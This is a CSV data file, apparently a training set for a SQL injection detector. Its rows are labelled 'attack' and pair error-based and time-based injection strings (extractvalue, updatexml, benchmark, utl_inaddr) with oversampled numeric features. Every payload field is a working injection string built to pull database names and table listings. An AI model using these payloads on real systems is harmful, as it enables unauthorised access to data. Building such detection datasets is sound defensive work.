id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000107,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000038,0.7670154177686528,161.0,29.0,3.835763720309985,46.997694523325634,38.20184438133949,55.800461095334875,20.0,0.29191114610761265,0.23727853653005895,0.34658671487785636,0.12422360248447205,1.5986167139953824,0.0,0.0,0.0,0.0,1.0,0.0,10.800461095334873,0.0,0.0,5.800461095334873,1.0,1.0,0.0,0.0,0.8004610953348725,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.19953890466512747,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1995389046651277
SMOTE_000108,attack,error,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000046,1.0220474187676063,163.67530803396085,28.662345983019573,3.6890337109709925,42.6493839320783,32.57139806226156,63.896090028300705,24.558436011320282,0.2611067668166375,0.19861425191860216,0.39027862902466787,0.15000035224009245,4.0,0.0,0.0,0.0,0.0,1.7792180056601414,0.0,12.0,2.0,0.0,4.779218005660142,1.7792180056601417,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.7792180056601414,0.0,-1.3877787807814457e-17,0.0,1.7792180056601414,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22078199433985846,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7792180056601414
SMOTE_000109,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000035,1.9490988168604926,163.40724986959586,31.53091671013471,3.9421758325799217,54.159916188518174,31.96375065202067,56.28358302905702,21.0,0.33116166026673205,0.1960435787771459,0.34427071483795946,0.12852404611816262,0.0,4.0,0.0,0.0,0.0,1.0,0.0,10.938166579730577,0.0,0.0,5.061833420269423,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5309167101347114,0.0,-1.3877787807814457e-17,0.0,1.5309167101347114,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4690832898652886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5309167101347114
SMOTE_000110,attack,error,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000046,0.5654388779934579,163.40926190199025,27.85538744563548,3.6754715980363333,39.421549782541916,35.578450217458084,63.55387445635478,24.85538744563548,0.24117218567649765,0.21806848167299983,0.3886181527614786,0.15214117988902393,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.710774891270956,2.0,0.0,5.144612554364522,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.8553874456354778,0.14461255436452208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000111,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000143,0.048910231806536225,157.143967914127,33.023994652354496,3.724280359776444,50.0,23.0,64.095978609418,20.047989304708995,0.31819005135765116,0.14636742362451952,0.40787209156244375,0.1275704334553856,0.0,1.0,0.0,0.0,0.0,0.0,0.0,14.023994652354498,0.023994652354498047,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000112,attack,error,"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000061,0.16158526072922394,139.82645287658676,26.82645287658677,3.5389003521379316,56.0,12.34709424682646,58.65290575317354,12.826452876586771,0.40049941618248414,0.08831838438009575,0.41945766113698235,0.09172453830043781,0.0,0.0,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,0.8264528765867696,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000113,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000051,0.004552840826011459,133.0,29.0,3.7435918750588737,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000114,attack,error,"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000138,0.1882558606941364,161.0,29.0,3.787921113953346,40.45374900012778,43.728334666496295,56.63583266675185,20.182083666624074,0.25126552173992406,0.2716045631459397,0.3517753581785829,0.12535455693555325,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.182083666624075,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000026,0.6990386218491844,141.92132209217075,24.26966947695731,3.550659935094958,36.0,35.0,53.921322092170755,17.0,0.25370188683814726,0.2466546122037543,0.3798398321734179,0.11980366878468064,0.26966947695731147,0.0,0.0,0.0,0.0,1.0,0.0,10.730330523042689,0.0,0.0,5.0,1.0,0.2696694769573114,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000116,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000139,0.9477697703377814,144.412689721939,25.41268972193899,3.6381247741494778,34.0,39.0,53.0,18.41268972193899,0.2354391067746204,0.27006250482971167,0.36700801938396715,0.1274903690117008,0.4126897219389904,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,6.0,1.0,0.41268972193899034,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000117,attack,error,"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000088,0.022233904701055986,135.10560815022222,24.011734238913583,3.5965543616237308,34.0,35.046936955654324,49.046936955654324,17.011734238913583,0.25166714623932324,0.2593950722096479,0.363022720661134,0.12591506088989482,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.011734238913581,0.0,0.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.011734238913581163,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.011734238913581
SMOTE_000118,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000126,0.8833767413155192,161.1482330206729,27.0,3.712908469359294,37.0,39.0,59.91858641653832,25.22964660413458,0.22981487304927087,0.24223729861950172,0.3714263178270354,0.156521510504192,0.0,4.0,0.0,0.0,0.0,2.0,0.0,11.22964660413458,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000119,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",nearest_attack_euclidean,R000110,0.8865796486870776,160.41014571095656,28.820291421913094,3.895555787163091,45.64058284382618,39.0,54.17970857808691,21.589854289043455,0.284489396107535,0.24312904958356735,0.33777932291891677,0.13460223138998093,4.0,0.0,0.0,0.0,0.0,1.589854289043454,0.0,10.0,0.0,0.0,6.0,1.589854289043454,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000120,attack,error,"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000098,0.2589847162847247,161.91122155971453,30.911221559714537,3.894194574534602,41.64488623885815,43.35511376114185,56.822443119429074,20.088778440285463,0.25719654417556204,0.26778413857209016,0.35094303183972786,0.12407628541261997,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.088778440285463,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.9112215597145372,0.08877844028546286,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000121,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000006,2.1955218128844582,133.9136681847445,36.776783906871174,4.175780477269906,69.29165823206549,0.9999999999999964,45.66070344122705,17.96130651145196,0.5201900744679961,0.007615432155755941,0.33808847069459325,0.1341060226816546,3.0,0.0,0.0,0.0,0.0,2.0,0.0,6.369045209161566,0.0,5.0,-4.440892098500626e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-1.3877787807814457e-17,1.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000122,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000071,0.0005961538754450656,133.0,30.0,3.7594236763893,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000123,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000143,0.987857768457774,156.62148915300648,32.62148915300647,3.712753666287605,50.0,23.0,64.0,19.621489153006472,0.3192440610137872,0.1468522680663421,0.4086323980976476,0.12527127282222306,0.0,0.6214891530064737,0.0,0.0,0.0,0.0,0.0,14.0,0.0,0.0,4.0,0.0,0.0,0.6214891530064737,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000124,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",nearest_attack_euclidean,R000097,0.9091574108109874,161.0,29.0,3.8719833879820453,49.817414424020576,35.946068460783536,55.23651711519589,20.0,0.3094249343106868,0.22326750596759962,0.3430839572372415,0.12422360248447205,3.2904486544123475,0.0,0.0,0.0,0.0,1.0,0.0,10.236517115195884,0.0,0.0,5.236517115195884,1.0,1.0,0.0,0.0,0.23651711519588414,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.7634828848041159,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.763482884804116
SMOTE_000125,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000112,0.027206715200851425,138.98817081038152,24.98817081038152,3.6151736383734185,36.0,35.0,51.0,16.98817081038152,0.2590150062989399,0.2518201450128582,0.36693792559016486,0.12222692309803698,0.9881708103815188,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.0,1.0,0.988170810381519,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000126,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000014,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000127,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000001,0.0719442968926195,110.70960700036892,36.14519649981554,4.2446356830981635,59.70960700036892,0.9999999999999964,35.0,15.0,0.5393164688832809,0.009033010414053327,0.3161553644918661,0.13549515621079974,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,4.0,-4.440892098500626e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-1.3877787807814457e-17,1.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000128,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000003,0.018869782681992017,111.98214710028515,35.017852899714846,4.240143694107738,60.982147100285154,0.9999999999999964,35.0,15.0,0.5445696188959573,0.00893000747262826,0.31255026154199,0.13395011208942428,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,0.0,4.982147100285152,-4.440892098500626e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-1.3877787807814457e-17,1.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000129,attack,error,"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000138,0.8052447634307071,162.3016213156129,29.325405328903223,3.791950631672063,40.023784013290324,44.3016213156129,57.650810657806446,20.325405328903223,0.2467330228571283,0.27286246245971474,0.35518871074409575,0.1252158039390612,0.6745946710967755,0.0,2.0,0.0,0.0,2.0,0.0,10.325405328903225,0.0,0.0,5.325405328903225,4.0,0.6745946710967755,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,error,"1' where 8277  =  8277 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000029,1.3511345783969417,161.46233431078338,29.46233431078338,3.8252802636668393,39.84933724313352,45.15066275686648,55.92466862156676,20.53766568921662,0.24676691175273094,0.27967667323244705,0.34634779775244084,0.12720861726238114,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.53766568921662,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.4623343107833803,0.5376656892166196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000131,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000153,0.46033901536803523,143.0890529397236,26.0,3.6792726729630836,34.0,39.0,51.47124235177886,18.617810587944717,0.23768335960834475,0.272636794844866,0.3595867160198318,0.13009312952695742,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.617810587944716,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000132,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000036,0.4839572512842348,140.99276540536385,25.0,3.6179274314639027,33.0,39.0,51.39421232429108,17.59855308107277,0.23412581035892333,0.27669413951509114,0.36438409830188206,0.12479595182410343,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.59855308107277,0.0,0.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000133,attack,error,select   (  case when   (  3863  =  1151  )   then 3863 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000019,0.0018985612626191758,133.0,28.0,3.719601942659248,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000134,attack,error,"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",nearest_attack_euclidean,R000134,0.7148469086651835,149.0,30.386786484823766,3.774344826912537,51.613213515176234,23.53773783839208,56.386786484823766,17.46226216160792,0.3463974061421224,0.15797139488853743,0.3784348086229783,0.1171963903463619,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.462262161607923,0.0,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,error,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,nearest_attack_euclidean,R000033,0.09117748945630647,155.0,27.91637836154491,3.7636918915758626,39.74913508463473,35.334486553820355,56.83275672308982,23.08362163845509,0.25644603280409506,0.22796442937948616,0.3666629466005795,0.1489265912158393,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.083621638455089,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
